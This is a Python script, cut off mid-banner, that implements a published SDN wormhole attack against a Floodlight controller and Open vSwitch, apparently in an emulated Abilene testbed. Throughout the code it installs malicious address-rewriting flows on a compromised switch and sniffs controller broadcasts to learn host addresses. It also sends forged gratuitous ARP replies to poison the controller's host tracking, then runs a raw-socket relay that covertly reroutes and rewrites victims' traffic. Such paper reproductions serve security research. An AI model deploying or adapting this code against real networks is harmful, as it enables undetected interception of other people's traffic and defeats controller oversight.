import random
import select
import socket
import struct
import subprocess
import threading
from scapy.all import ARP, Ether, IP, sendp, sniff

# ── Topology constants ─────────────────────────────────────────────────────────

RELAY_IFACE = "relay-eth0"
RELAY_MAC   = "00:00:00:00:00:0c"
RELAY_IP    = "10.1.0.3"

# Flow priorities — all above Floodlight's default (~1)
PRI_CATCHALL = 200    # Step 3: catch-all on intercepting switch
PRI_PHASE2   = 300    # Step 5: phase-2 flow on intercepting switch
PRI_RECOVERY = 400    # Step 6: address-recovery flow on destination switch
PRI_DATA_FWD = 500    # Step 7: data-forwarding flow on intercepting switch (highest)

SNIFF_TIMEOUT = 30    # seconds per broadcast sniff phase

# ── Wormhole topology: both switch sides ───────────────────────────────────────
#
# uplink_port : port on the intercepting switch that leads toward a NEIGHBOR
#               NORMAL SWITCH. After S1 rewrites the address, S1 sends the
#               packet out uplink_port to the neighbor. The neighbor has no
#               matching flow for the bogus vIP/vMAC, so it issues a Packet-In
#               to Floodlight. Floodlight cannot locate the destination in its
#               Host Profile and issues a network-wide PacketOut FLOOD — which
#               reaches the relay host on its own edge switch.
#
#               This matches the paper (Sec. III.C.4.3, Fig. 5) exactly:
#                 "When the packet arrives at a normal switch, it will be
#                  forwarded to the controller. Because of the mismatch between
#                  IP and MAC addresses, the controller instructs the normal
#                  switch to broadcast the packet."
#
#               Address delivery (Steps 3–5) therefore relies on controller-
#               mediated broadcasting, NOT local FLOOD on S1. This is also
#               what makes the attack detectable via "frequent broadcast
#               process" — the paper's own stated disadvantage.
#
#               Data forwarding (Step 7) ALSO uses uplink_port, but as a
#               direct unicast output — by that point address delivery is
#               complete and no controller involvement is needed.

SWITCH_SIDES = {
    "s1": {
        "uplink_port": 1,            # s4-eth2 → s7 (Denver) → relay
        "hosts": {
            "ha": (4, "10.1.0.1"),  # abilene.py EXTRA_HOSTS → s4 port4
        },
    },
    "s9": {
        "uplink_port": 2,            # s8-eth1 → s7 (Denver) → relay
        "hosts": {
            "hb": (5, "10.1.0.2"),  # abilene.py EXTRA_HOSTS → s8 port5
        },
    },
}

# IP → (bridge, port) lookup — used after Phase B to find the recovery switch/port
IP_TO_SWITCH_PORT: dict = {
    ip: (bridge, port)
    for bridge, side in SWITCH_SIDES.items()
    for _hname, (port, ip) in side["hosts"].items()
}

INTERCEPTORS: list = [
    {
        "name":             f"{hname}→*",
        "intercept_bridge": bridge,
        "intercept_port":   port,
        "uplink_port":      side["uplink_port"],
    }
    for bridge, side in SWITCH_SIDES.items()
    for hname, (port, _ip) in side["hosts"].items()
]

# ── OVS flow helpers ───────────────────────────────────────────────────────────

def _run(cmd: str) -> None:
    print(f"  $ {cmd}")
    r = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if r.returncode != 0 and r.stderr.strip():
        print(f"  [!] {r.stderr.strip()}")


def add_flow(bridge: str, priority: int, match: str, actions: str) -> None:
    flow = f"priority={priority},{match},actions={actions}"
    _run(f"ovs-ofctl -O OpenFlow15 add-flow {bridge} '{flow}'")


def del_flow(bridge: str, match: str) -> None:
    """Delete all flows matching criteria (priority= is ignored — use del_flow_strict when priority matters)."""
    _run(f"ovs-ofctl -O OpenFlow15 del-flows {bridge} '{match}'")


def del_flow_strict(bridge: str, priority: int, match: str) -> None:
    """Delete exactly one flow matching priority + match fields (--strict: priority must match exactly)."""
    _run(f"ovs-ofctl -O OpenFlow15 --strict del-flows {bridge} 'priority={priority},{match}'")


# ── Random bogus-address generators ───────────────────────────────────────────

def _random_vip() -> str:
    """Non-routable IP absent from the controller's Host Profile.

    Paper: "The destination IP address of one packet is altered to a random
    value. The random value is decided by the attacker, and thus, the forged
    packets can be identified by these values."
    """
    return f"192.168.200.{random.randint(2, 254)}"


def _random_vmac() -> str:
    """Locally-administered unicast MAC absent from the controller's Host Profile."""
    tail = [random.randint(0, 255) for _ in range(3)]
    return "02:aa:bb:" + ":".join(f"{b:02x}" for b in tail)


# ── Forged reply: claim vIP/vMAC location in Floodlight's Host Profile ────────

# Floodlight's host idle-timeout default is 5 s.
# Re-send every FORGED_REPLY_INTERVAL seconds to keep the entry alive.
FORGED_REPLY_INTERVAL = 4.0


def send_forged_reply(vip: str, vmac: str, name: str) -> None:
    """
    Paper Section III.C.4.3 — deception step.

    Paper: "as the attacker knows the bogus addresses, the relay host could
    send the response messages with these addresses to claim this host
    location. With these forged messages, the controller would observe some
    hosts which change locations and cannot detect the attack."

    The relay claims ownership of the SAME bogus address pair it created:
      hwsrc=vMAC, psrc=vIP  →  single host entry: vMAC ↔ vIP at S7 port 5

    This stops Floodlight broadcasting for BOTH unknown ip_dst=vIP (Phase A)
    AND unknown eth_dst=vMAC (Phase B) with a single gratuitous ARP reply.

    Gratuitous ARP reply (op=2, dst=broadcast, pdst=psrc) — processed by
    Floodlight's host-tracker to update the Host Profile at the relay's
    attachment point (S7 port 5).
    """
    pkt = (
        Ether(src=vmac, dst="ff:ff:ff:ff:ff:ff") /
        ARP(op=2, hwsrc=vmac, psrc=vip,
            hwdst="00:00:00:00:00:00", pdst=vip)
    )
    sendp(pkt, iface=RELAY_IFACE, verbose=False)
    print(f"[+] [{name}] Forged reply: "
          f"hwsrc={vmac}  psrc={vip}  "
          f"→ Floodlight: {vmac} ↔ {vip} at S7:5")


def forged_reply_loop(vip: str, vmac: str,
                      name: str, stop_event: threading.Event) -> None:
    """
    Background thread — re-sends the forged reply every FORGED_REPLY_INTERVAL
    seconds to keep vMAC ↔ vIP alive in Floodlight's Host Profile before
    the idle-timeout evicts it.
    """
    # Wait first so the one-shot send_forged_reply() remains the only immediate
    # forged ARP; periodic refresh happens only if flow setup takes longer.
    while not stop_event.wait(FORGED_REPLY_INTERVAL):
        send_forged_reply(vip, vmac, name)
    print(f"[*] [{name}] Forged reply loop stopped.")


# ── Step 3: Catch-all flow on intercepting switch ─────────────────────────────

def install_catchall(direction: dict, vip: str) -> None:
    """
    Paper Fig. 5 — first flow entry on S1 (the compromised switch).

    Matches all IP traffic arriving from the source host port.
    Replaces ip_dst with vIP (random, absent from controller's Host Profile).

    Action: output:uplink_port  (send to neighbor normal switch)
    ──────────────────────────────────────────────────────────────
    Paper: "the compromised switch S1 modifies ... The destination IP address
    of one packet is altered to a random value. ... When the packet arrives
    at a normal switch, it will be forwarded to the controller. Because of
    the mismatch between IP and MAC addresses, the controller instructs the
    normal switch to broadcast the packet to all the edge switches."

    Mechanism enforced by this flow entry:
      1. S1 rewrites ip_dst to vIP and forwards out uplink_port.
      2. The neighbor (normal) switch has no flow matching (dMAC, vIP) →
         Packet-In to Floodlight.
      3. Floodlight's DeviceManager cannot resolve vIP in the Host Profile →
         issues a PacketOut with action=FLOOD, distributed to every edge
         port network-wide.
      4. The relay host (on S7's edge port) receives this controller-mediated
         broadcast and reads sMAC / dMAC / sIP from the original packet.

    This is deliberately controller-mediated — NOT a local FLOOD on S1.
    Local FLOOD would be faster and quieter, but would not match the paper's
    mechanism (which is also what causes the attack's signature "frequent
    broadcast process" discussed as the method's disadvantage).
    """
    add_flow(
        bridge=direction["intercept_bridge"],
        priority=PRI_CATCHALL,
        match=f"in_port={direction['intercept_port']},ip",
        actions=f"set_field:{vip}->ip_dst,output:{direction['uplink_port']}",
    )
    print(f"[+] [{direction['name']}] Catch-all (Phase A) on "
          f"{direction['intercept_bridge']}: "
          f"in_port={direction['intercept_port']},ip  →  "
          f"ip_dst={vip}, output:{direction['uplink_port']}  "
          f"[neighbor switch Packet-Ins; Floodlight broadcasts network-wide]")


# ── Step 4: Phase A — sniff first broadcast, extract sMAC / dMAC / sIP ────────

def sniff_phase_a(direction: dict, vip: str) -> dict:
    """
    Paper Fig. 5 — relay sniffs the controller-mediated broadcast.

    S1 has forwarded the ip_dst=vIP packet to a neighbor normal switch.
    Neighbor issues Packet-In → Floodlight has no Host Profile for vIP →
    Floodlight issues a PacketOut FLOOD to all edge ports network-wide →
    relay-eth0 receives a copy.

    Extracts (fields left untouched by the catch-all — only ip_dst was changed):
      sMAC ← eth_src   (source host MAC)
      dMAC ← eth_dst   (destination host MAC)
      sIP  ← ip_src    (source host IP)

    Paper: "Once the relay host receives this packet, it would acquire the
    original MAC and the source IP addresses."

    Paper-fidelity (Sentence 8: "S1 modifies two packets"):
      The moment the target broadcast is identified, the catchall flow is
      deleted from INSIDE the sniff callback — before sniff() even returns.
      This bounds Phase A broadcasts to essentially 1 (plus whatever was
      already in flight through the OVS datapath pipeline when del_flow
      executes, typically 0–2 packets). Without this, a persistent flow
      would keep modifying every packet from the source host for the full
      duration of the sniff window, producing dozens or hundreds of extra
      broadcasts at high packet rates.
    """
    print(f"\n[*] [{direction['name']}] Phase A — waiting for controller-broadcast packet "
          f"with ip_dst={vip} on {RELAY_IFACE} (timeout={SNIFF_TIMEOUT}s) …")
    found: dict = {}
    deleted = {"done": False}   # one-shot guard (mutable dict for closure write)
    bridge      = direction["intercept_bridge"]
    match_str   = f"in_port={direction['intercept_port']},ip"

    def _match(pkt):
        if Ether in pkt and IP in pkt and pkt[IP].dst == vip:
            found["sMAC"] = pkt[Ether].src
            found["dMAC"] = pkt[Ether].dst
            found["sIP"]  = pkt[IP].src
            # Paper-fidelity: stop modifying further packets IMMEDIATELY.
            # Idempotent guard in case scapy invokes stop_filter more than once.
            if not deleted["done"]:
                deleted["done"] = True
                del_flow_strict(bridge, PRI_CATCHALL, match_str)
                print(f"[+] [{direction['name']}] Phase A catch-all removed "
                      f"from inside sniff callback (paper: 'two packets' fidelity).")
            return True
        return False

    sniff(iface=RELAY_IFACE, stop_filter=_match, timeout=SNIFF_TIMEOUT, store=False)

    if not found:
        # Safety: sniff timed out without match. Remove the catchall anyway so
        # it doesn't keep modifying packets forever.
        if not deleted["done"]:
            del_flow_strict(bridge, PRI_CATCHALL, match_str)
            print(f"[!] [{direction['name']}] Phase A timed out — catch-all "
                  f"removed defensively.")
        raise TimeoutError(
            f"[{direction['name']}] Phase A timed out: no controller-broadcast packet with "
            f"ip_dst={vip} on {RELAY_IFACE} within {SNIFF_TIMEOUT}s.\n"
            "  → Is fake_lldp_inject.py running?  Is traffic flowing from ha?\n"
            "  → Check Floodlight logs for Packet-In from the neighbor switch."
        )

    print(f"[+] [{direction['name']}] Phase A done  →  "
          f"sMAC={found['sMAC']}  dMAC={found['dMAC']}  sIP={found['sIP']}")
    return found


# ── Step 5 (part 1): Phase-2 flow on intercepting switch ──────────────────────

def install_phase2(direction: dict, dmac: str, vmac: str) -> None:
    """
    Paper Fig. 5 — second flow entry on S1, installed after Phase A.

    Paper: "Then the attacker installs a high-priority flow entry into S1 to
    acquire the destination IP address like the previous process."

    Matches the next packet from the source host with dl_dst = dMAC
    (the original destination MAC, learned in Phase A).
    Replaces eth_dst with vMAC (random, absent from Host Profile).
    ip_dst is left INTACT — it still carries the original dIP.

    Action: output:uplink_port  (send to neighbor normal switch)
    ──────────────────────────────────────────────────────────────
    Same mechanism as Phase A but with a MAC mismatch instead of IP:
      1. S1 rewrites eth_dst to vMAC and forwards out uplink_port.
      2. Neighbor normal switch has no flow matching eth_dst=vMAC →
         Packet-In to Floodlight.
      3. Floodlight's DeviceManager resolves by MAC first — vMAC is unknown,
         so the destination cannot be located. PacketOut FLOOD network-wide.
      4. Relay receives the broadcast; ip_dst still carries the original
         dIP, which relay reads directly.

    NOTE: Phase B relies on Floodlight's forwarding keying off eth_dst
    (MAC-based device lookup) rather than ip_dst. Floodlight's
    net.floodlightcontroller.forwarding.Forwarding does exactly this via
    IDeviceService.findDevice() — so an unknown vMAC triggers FLOOD even
    though ip_dst would otherwise resolve to h_b.
    """
    add_flow(
        bridge=direction["intercept_bridge"],
        priority=PRI_PHASE2,
        match=f"in_port={direction['intercept_port']},ip,dl_dst={dmac}",
        actions=f"set_field:{vmac}->eth_dst,output:{direction['uplink_port']}",
    )
    print(f"[+] [{direction['name']}] Phase-2 flow (Phase B) on "
          f"{direction['intercept_bridge']}: "
          f"dl_dst={dmac}  →  eth_dst={vmac}, output:{direction['uplink_port']}  "
          f"[neighbor Packet-Ins; Floodlight broadcasts; relay reads dIP]")


# ── Step 5 (part 2): Phase B — sniff second broadcast, extract dIP ────────────

def sniff_phase_b(direction: dict, vmac: str, dmac: str) -> str:
    """
    Paper Fig. 5 — relay sniffs the second controller-mediated broadcast.

    S1 has forwarded the eth_dst=vMAC packet to the neighbor.
    Neighbor Packet-Ins → Floodlight has no Host Profile for vMAC →
    PacketOut FLOOD network-wide → relay-eth0 receives the packet.
    ip_dst in this packet is the ORIGINAL dIP (untouched by phase-2 flow).

    Paper-fidelity (Sentence 8: "S1 modifies two packets"):
      Same as sniff_phase_a — the phase-2 flow is deleted from INSIDE the
      sniff callback the instant the target broadcast is identified, to
      bound Phase B broadcasts to essentially 1.

    dmac is required to reconstruct the exact match string of the installed
    Phase B flow, so we can issue a targeted del_flow_strict.
    """
    print(f"[*] [{direction['name']}] Phase B — waiting for controller-broadcast packet "
          f"with eth_dst={vmac} on {RELAY_IFACE} (timeout={SNIFF_TIMEOUT}s) …")
    found: dict = {}
    deleted = {"done": False}   # one-shot guard (mutable dict for closure write)
    vmac_normalized = vmac.lower()
    bridge          = direction["intercept_bridge"]
    # Phase B match matches the installed flow in install_phase2()
    match_str       = (f"in_port={direction['intercept_port']},ip,"
                       f"dl_dst={dmac}")

    def _match(pkt):
        if (Ether in pkt and IP in pkt and
                pkt[Ether].dst.lower() == vmac_normalized):
            found["dIP"] = pkt[IP].dst
            # Paper-fidelity: stop modifying further packets IMMEDIATELY.
            if not deleted["done"]:
                deleted["done"] = True
                del_flow_strict(bridge, PRI_PHASE2, match_str)
                print(f"[+] [{direction['name']}] Phase B flow removed "
                      f"from inside sniff callback (paper: 'two packets' fidelity).")
            return True
        return False

    sniff(iface=RELAY_IFACE, stop_filter=_match, timeout=SNIFF_TIMEOUT, store=False)

    if not found:
        # Safety: defensive removal if sniff timed out.
        if not deleted["done"]:
            del_flow_strict(bridge, PRI_PHASE2, match_str)
            print(f"[!] [{direction['name']}] Phase B timed out — flow "
                  f"removed defensively.")
        raise TimeoutError(
            f"[{direction['name']}] Phase B timed out: no controller-broadcast packet with "
            f"eth_dst={vmac} on {RELAY_IFACE} within {SNIFF_TIMEOUT}s."
        )

    print(f"[+] [{direction['name']}] Phase B done  →  dIP={found['dIP']}")
    return found["dIP"]


# ── Step 6: Recovery flow on destination switch ────────────────────────────────

def install_recovery(direction: dict, smac: str, dmac: str,
                     sip: str, dip: str) -> None:
    """
    Paper Fig. 5 — flow entry installed on S2 by the relay/attacker.

    Paper: "After acquiring the complete addresses, the attacker would take
    actions like in method 1 to recover the original addresses."

    Matches relay-forwarded packets arriving with ip_src=RELAY_IP, ip_dst=dIP.
    Restores all original addresses before delivering to destination host.

    NOTE: nw_src=RELAY_IP is an implementation guard not present in the
    paper's flow specification. Paper only requires nw_dst=dIP. This addition
    prevents mangling of legitimate traffic to dIP from other sources.
    """
    add_flow(
        bridge=direction["recovery_bridge"],
        priority=PRI_RECOVERY,
        match=f"ip,nw_src={RELAY_IP},nw_dst={dip}",
        actions=(
            f"set_field:{smac}->eth_src,"
            f"set_field:{sip}->ip_src,"
            f"set_field:{dmac}->eth_dst,"
            f"set_field:{dip}->ip_dst,"
            f"output:{direction['recovery_host_port']}"
        ),
    )
    print(f"[+] [{direction['name']}] Recovery flow on {direction['recovery_bridge']}: "
          f"nw_src={RELAY_IP},ip_dst={dip}  →  restore {smac}/{sip}→{dmac}/{dip}, "
          f"out:{direction['recovery_host_port']}")


# ── Temporary flow cleanup ─────────────────────────────────────────────────────

def cleanup_temp_flows(direction: dict, dmac: str) -> None:
    """
    Defensive safety-net removal of the Phase B flow on the intercepting
    switch.

    In the normal path, sniff_phase_b() already deleted this flow from inside
    its match callback (paper-fidelity, bounds broadcasts to ~1). This call
    is a no-op in that normal path — del_flow_strict against a non-existent
    flow is harmless, OVS just logs a warning.

    The safety net matters if sniff_phase_b's in-callback deletion somehow
    failed (e.g., transient ovs-ofctl error, race), leaving the flow installed.
    This ensures the phase-2 flow cannot survive past address-delivery and
    leak modified packets into the data phase.

    Catch-all (Phase A) is similarly self-removed by sniff_phase_a() already.
    """
    del_flow_strict(direction["intercept_bridge"], PRI_PHASE2,
                    f"in_port={direction['intercept_port']},ip,dl_dst={dmac}")
    print(f"[+] [{direction['name']}] Phase B flow safety-net cleanup "
          f"on {direction['intercept_bridge']} (no-op if already removed).")


# ── Step 7 (OVS flow): Data-forwarding flow on intercepting switch ─────────────

def install_data_forward_flow(direction: dict, smac: str, sip: str,
                               dmac: str, dip: str) -> None:
    """
    Paper Fig. 5 — permanent data-forwarding flow on S1.

    Matches exact source→destination flow (src/dst MAC+IP).
    Rewrites destination to relay:
        eth_dst ← RELAY_MAC
        ip_dst  ← RELAY_IP
        (ip_src / eth_src left unchanged — relay uses sIP to identify the flow)

    Action: output:{uplink_port}  (direct unicast — NOT via controller)
    ───────────────────────────────────────────────────────────────────
    Address delivery is complete at this point. The relay already knows
    all addresses. Direct output to uplink_port is correct here —
    no broadcast needed, no controller involvement needed.

    Paper Fig. 5 notation clarification:
      - Addr(R)→dIP: ip_dst is overwritten with RELAY_IP
        (relay's address replaces destination).
      - Addr(H1)→sIP: ip_src is LEFT UNCHANGED
        (source host address stays).
      - relay_packet_loop then does the reverse:
        Addr(R)→sIP (ip_src=RELAY_IP), Addr(H2)→dIP (ip_dst=dIP).
    """
    add_flow(
        bridge=direction["intercept_bridge"],
        priority=PRI_DATA_FWD,
        match=(
            f"in_port={direction['intercept_port']},ip,"
            f"dl_src={smac},dl_dst={dmac},"
            f"nw_src={sip},nw_dst={dip}"
        ),
        actions=(
            f"set_field:{RELAY_MAC}->eth_dst,"
            f"set_field:{RELAY_IP}->ip_dst,"
            f"output:{direction['uplink_port']}"
        ),
    )
    print(f"[+] [{direction['name']}] Data-fwd flow on {direction['intercept_bridge']}: "
          f"{smac}/{sip}→{dmac}/{dip}  →  relay({RELAY_IP}) "
          f"via port {direction['uplink_port']}  [direct unicast]")


# ── Step 7 (relay loop): Forward intercepted packets to destination switch ─────

def relay_packet_loop(direction: dict, info: dict,
                      stop_event: threading.Event) -> None:
    """
    Paper Fig. 5 — relay continuously forwards intercepted packets to S2.

    Packets arriving on relay-eth0 have:
        eth_dst = RELAY_MAC,  ip_dst = RELAY_IP    (redirected by S1's data-fwd flow)
        eth_src = sMAC,       ip_src = sIP          (original source, unchanged)

    Relay rewrites for delivery to S2:
        eth_src ← RELAY_MAC   )  Paper Fig. 5:
        ip_src  ← RELAY_IP    )  "Addr(R)→sIP"
        eth_dst ← dMAC        )  "Addr(H2)→dIP"
        ip_dst  ← dIP         )

    S2 recovery flow then matches ip_dst=dIP, restores all original addresses,
    and delivers to the destination host.
    """
    smac_b      = bytes.fromhex(info["sMAC"].replace(":", ""))
    dmac_b      = bytes.fromhex(info["dMAC"].replace(":", ""))
    relay_mac_b = bytes.fromhex(RELAY_MAC.replace(":", ""))
    relay_ip_b  = socket.inet_aton(RELAY_IP)
    sip_b       = socket.inet_aton(info["sIP"])
    dip_b       = socket.inet_aton(info["dIP"])

    # Prevent relay kernel from generating ICMP-unreachable for RELAY_IP-addressed packets.
    _run(f"iptables -A INPUT -s {info['sIP']} -d {RELAY_IP} -j DROP")

    ETH_P_ALL = 0x0003
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ALL))
    sock.bind((RELAY_IFACE, 0))
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 4 * 1024 * 1024)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
    sock.setblocking(False)

    # ── Precompute RFC 1624 incremental checksum delta ──────────────────────
    # Changes: ip_src: sIP → RELAY_IP,  ip_dst: RELAY_IP → dIP
    # RELAY_IP cancels out (appears as new ip_src AND old ip_dst):
    #   csum_delta = (~sip_w0 & 0xFFFF) + 0xFFFF + dip_w0
    #              + (~sip_w1 & 0xFFFF) + 0xFFFF + dip_w1
    sip_w0, sip_w1 = struct.unpack('!HH', sip_b)
    dip_w0, dip_w1 = struct.unpack('!HH', dip_b)
    csum_delta = ((0xFFFF ^ sip_w0) + 0xFFFF + dip_w0 +
                  (0xFFFF ^ sip_w1) + 0xFFFF + dip_w1)

    buf = bytearray(65536)
    mv  = memoryview(buf)

    print(f"[*] [{direction['name']}] Relay loop active: "
          f"forwarding {info['sIP']} → {info['dIP']} ({info['dMAC']})")

    while not stop_event.is_set():
        if not select.select([sock], [], [], 0.2)[0]:
            continue

        try:
            nbytes = sock.recv_into(mv)
        except BlockingIOError:
            continue

        if nbytes < 34:
            continue

        # ── VLAN tag detection (802.1Q ethertype = 0x8100) ───────────────────
        if buf[12:14] == b'\x81\x00':
            eth_offset = 18   # 14-byte Ethernet header + 4-byte VLAN tag
        else:
            eth_offset = 14   # standard Ethernet II

        # Must be IPv4 addressed to RELAY_MAC
        if buf[0:6] != relay_mac_b or buf[eth_offset - 2:eth_offset] != b'\x08\x00':
            continue

        # IP field offsets relative to eth_offset
        proto_off  = eth_offset + 9   # protocol byte
        hcsum_off  = eth_offset + 10  # IP header checksum
        ipsrc_off  = eth_offset + 12  # ip_src
        ipdst_off  = eth_offset + 16  # ip_dst

        # Must match this flow: ip_src=sIP, ip_dst=RELAY_IP
        if buf[ipsrc_off:ipsrc_off+4] != sip_b or buf[ipdst_off:ipdst_off+4] != relay_ip_b:
            continue

        # ── Rewrite: src=relay, dst=destination real addresses ───────────────
        # Paper Fig. 5: "Addr(R)→sIP, Addr(H2)→dIP"
        buf[0:6]                    = dmac_b       # eth_dst ← dMAC
        buf[6:12]                   = relay_mac_b  # eth_src ← RELAY_MAC
        buf[ipsrc_off:ipsrc_off+4]  = relay_ip_b   # ip_src  ← RELAY_IP
        buf[ipdst_off:ipdst_off+4]  = dip_b        # ip_dst  ← dIP

        # ── RFC 1624 incremental IP header checksum update ───────────────────
        old_hc = (buf[hcsum_off] << 8) | buf[hcsum_off + 1]
        s = (0xFFFF ^ old_hc) + csum_delta
        s = (s & 0xFFFF) + (s >> 16)
        s = (s & 0xFFFF) + (s >> 16)
        new_hc = (~s) & 0xFFFF
        buf[hcsum_off]     = new_hc >> 8
        buf[hcsum_off + 1] = new_hc & 0xFF

        # ── RFC 1624 incremental TCP/UDP pseudo-header checksum update ────────
        # TCP and UDP checksums cover a pseudo-header with ip_src + ip_dst.
        # The same csum_delta applies (same two fields changed).
        ihl             = (buf[eth_offset] & 0x0F) * 4
        transport_start = eth_offset + ihl
        proto           = buf[proto_off]

        if proto == 6:    # TCP — checksum at transport_start + 16
            tcp_csum_off = transport_start + 16
            if tcp_csum_off + 2 <= nbytes:
                old_tc = (buf[tcp_csum_off] << 8) | buf[tcp_csum_off + 1]
                s = (0xFFFF ^ old_tc) + csum_delta
                s = (s & 0xFFFF) + (s >> 16)
                s = (s & 0xFFFF) + (s >> 16)
                new_tc = (~s) & 0xFFFF
                buf[tcp_csum_off]     = new_tc >> 8
                buf[tcp_csum_off + 1] = new_tc & 0xFF

        elif proto == 17:  # UDP — checksum at transport_start + 6
            udp_csum_off = transport_start + 6
            if udp_csum_off + 2 <= nbytes:
                udp_csum = (buf[udp_csum_off] << 8) | buf[udp_csum_off + 1]
                if udp_csum != 0x0000:  # 0x0000 means checksum disabled — leave as-is
                    s = (0xFFFF ^ udp_csum) + csum_delta
                    s = (s & 0xFFFF) + (s >> 16)
                    s = (s & 0xFFFF) + (s >> 16)
                    new_uc = (~s) & 0xFFFF
                    # UDP uses 0xFFFF to represent a computed-zero checksum
                    new_uc = 0xFFFF if new_uc == 0x0000 else new_uc
                    buf[udp_csum_off]     = new_uc >> 8
                    buf[udp_csum_off + 1] = new_uc & 0xFF

        try:
            sock.send(mv[:nbytes])
        except OSError as e:
            print(f"  [!] [{direction['name']}] send error: {e}")

    sock.close()
    _run(f"iptables -D INPUT -s {info['sIP']} -d {RELAY_IP} -j DROP")
    print(f"[*] [{direction['name']}] Relay loop stopped.")


# ── Full address-delivery + data-forwarding sequence for one interceptor ───────

def run_address_delivery(interceptor: dict) -> dict:
    """
    Execute the complete paper Fig. 5 sequence for one flow.

    Phase A (Steps 3-4):
      Install catch-all with output:uplink_port → neighbor switch Packet-Ins
      → Floodlight broadcasts network-wide → relay sniffs and extracts
      sMAC, dMAC, sIP.

    Phase B (Step 5):
      Install phase-2 flow with output:uplink_port → neighbor Packet-Ins →
      Floodlight broadcasts → relay sniffs and extracts dIP.

    Step 6: Install recovery flow on destination switch (S2).
    Step 7: Install data-forward flow (direct unicast) + start relay loop.
    """
    vip  = _random_vip()
    vmac = _random_vmac()

    print(f"\n{'═' * 60}")
    print(f" Create Mismatch — {interceptor['name']}")
    print(f"   vIP  = {vip}    (Phase A: triggers controller broadcast)")
    print(f"   vMAC = {vmac}    (Phase B: triggers controller broadcast)")
    print(f"{'═' * 60}")

    # ── Phase A: broadcast → relay learns sMAC, dMAC, sIP (Steps 3-4) ───────
    # Paper-fidelity: sniff_phase_a deletes the catch-all from inside its
    # match callback the instant the target packet is identified, bounding
    # Phase A broadcasts to ~1 regardless of sniff-window duration or
    # source-host packet rate.
    install_catchall(interceptor, vip)                 # Step 3: output to neighbor on vIP
    info = sniff_phase_a(interceptor, vip)             # Step 4: relay sniffs + deletes flow

    # ── Phase B: broadcast → relay learns dIP (Step 5) ───────────────────────
    # Paper-fidelity: same pattern — sniff_phase_b deletes the phase-2 flow
    # from inside its match callback.
    install_phase2(interceptor, info["dMAC"], vmac)          # Step 5a: output to neighbor on vMAC
    info["dIP"] = sniff_phase_b(interceptor, vmac, info["dMAC"])  # Step 5b: relay sniffs + deletes flow

    # ── Resolve recovery switch + port from learned dIP ───────────────────────
    if info["dIP"] not in IP_TO_SWITCH_PORT:
        raise ValueError(
            f"[{interceptor['name']}] Unknown destination IP {info['dIP']} — "
            "not in SWITCH_SIDES. Add the host."
        )
    recovery_bridge, recovery_host_port = IP_TO_SWITCH_PORT[info["dIP"]]

    dst_name = next(
        (hn for _, side in SWITCH_SIDES.items()
         for hn, (_, ip) in side["hosts"].items()
         if ip == info["dIP"]),
        info["dIP"],
    )
    direction = {
        **interceptor,
        "name":               interceptor["name"].replace("*", dst_name),
        "recovery_bridge":    recovery_bridge,
        "recovery_host_port": recovery_host_port,
    }
    info.update(vIP=vip, vMAC=vmac)

    # Issue 4 fix: send forged reply immediately after Phase B, BEFORE installing
    # any flows — stops controller broadcasting vIP/vMAC before data-fwd goes live.
    send_forged_reply(vip, vmac, direction["name"])
    forged_stop = threading.Event()
    forged_thread = threading.Thread(
        target=forged_reply_loop,
        args=(vip, vmac, direction["name"], forged_stop),
        daemon=True,
        name=f"forged[{direction['name']}]",
    )
    forged_thread.start()
    print(f"[*] [{direction['name']}] Forged reply thread started "
          f"(refresh every {FORGED_REPLY_INTERVAL}s).")

    # Address delivery is done; remove temporary Phase B flow before data phase.
    cleanup_temp_flows(direction, info["dMAC"])

    # Paper Fig. 5 ordering (steps 9 → 10): install the data-forwarding flow
    # on S1 FIRST, then the recovery flow on S2 SECOND.
    #
    # Fig. 5 arrow sequence (top to bottom):
    #   9.  dashed "Install a flow entry matching this address"  →  S1
    #   10. solid  "Install a flow entry to recover the address" →  S2
    #
    # Race window accepted: between the two ovs-ofctl calls (~10-50 ms),
    # S1 may already be redirecting packets to the relay while S2 has no
    # recovery flow yet. Those in-flight packets will arrive at s8 with
    # ip_src=RELAY_IP and may be handled by Floodlight as normal traffic
    # (forwarded to hb with relay's source addresses) or dropped. This
    # brief glitch is the price of paper-exact fidelity; subsequent
    # packets (once the recovery flow is in place) are processed correctly.
    install_data_forward_flow(          # Step 9 — S1 first
        direction=direction,
        smac=info["sMAC"],
        sip=info["sIP"],
        dmac=info["dMAC"],
        dip=info["dIP"],
    )
    install_recovery(                   # Step 10 — S2 second
        direction=direction,
        smac=info["sMAC"],
        dmac=info["dMAC"],
        sip=info["sIP"],
        dip=info["dIP"],
    )

    # Floodlight's Host Profile is only needed during address-delivery phases.
    # Once OVS flows handle all forwarding, the forged reply is unnecessary.
    forged_stop.set()

    print(f"\n[✓] [{direction['name']}] Address delivery complete:")
    print(f"    sMAC={info['sMAC']}  sIP={info['sIP']}")
    print(f"    dMAC={info['dMAC']}  dIP={info['dIP']}")

    stop_event = threading.Event()
    t = threading.Thread(
        target=relay_packet_loop,
        args=(direction, info, stop_event),
        daemon=True,
        name=f"relay[{direction['name']}]→{info['dIP']}",
    )
    t.start()
    print(f"[*] [{direction['name']}] Relay thread started.")

    info["stop_event"]     = stop_event
    info["thread"]         = t
    info["forged_stop"]    = forged_stop
    info["forged_thread"]  = forged_thread
    info["direction"]      = direction
    return info


# ── Per-interceptor worker ─────────────────────────────────────────────────────

def interceptor_worker(interceptor: dict, learned: dict,
                       learned_lock: threading.Lock) -> None:
    while True:
        try:
            info = run_address_delivery(interceptor)
            direction = info["direction"]
            with learned_lock:
                learned[f"{direction['name']}:{info['dIP']}"] = info
            print(f"\n[*] [{direction['name']}] Active. Relay forwarding …\n")

        except (TimeoutError, ValueError) as exc:
            print(f"\n[!] {exc}")
            print(f"[*] [{interceptor['name']}] Restarting …\n")


# ── Entry point ────────────────────────────────────────────────────────────────

def main() -> None:
    sides_summary = "  ".join(
        f"{br}: {', '.join(SWITCH_SIDES[br]['hosts'])}"
        for br in SWITCH_SIDES
    )
    print(f"""
+----------------------------------------------------------+
|  Create Mismatch  --  Section III.C.4.3  (paper-exact)   |
|  "Flow Misleading: Worm-Hole Attack in SDN" (2021)       |
|                                                          |
|  Sides  : {sides_summary:<47}|
|  Relay  : relay-eth0  ({RELAY_IP})                   |
|                                                          |
|  Phase A: S1 → neighbor → Floodlight broadcast on vIP   |
